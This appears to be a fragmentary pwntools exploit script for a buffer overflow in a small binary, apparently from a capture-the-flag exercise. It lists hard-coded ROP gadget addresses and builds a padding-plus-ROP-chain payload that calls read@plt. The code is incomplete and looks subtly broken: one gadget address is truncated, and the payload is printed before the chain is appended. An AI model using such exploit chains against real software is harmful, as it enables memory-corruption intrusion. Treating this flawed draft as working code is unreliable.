from pwn import *
import sys


# ROP gadgets

pop_rdi = 0x4005a9
pop_rsi = 0x4005ab
pop_rdx = 0x4005a
pop_rax = 0x4005a7


read_plt = 0x400440




payload = ""
payload += "A" * 16
payload += "BBBB"
sys.stdout.write(payload)
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(pop_rsi)
payload += p64(0x300)
payload += p64(read_plt)




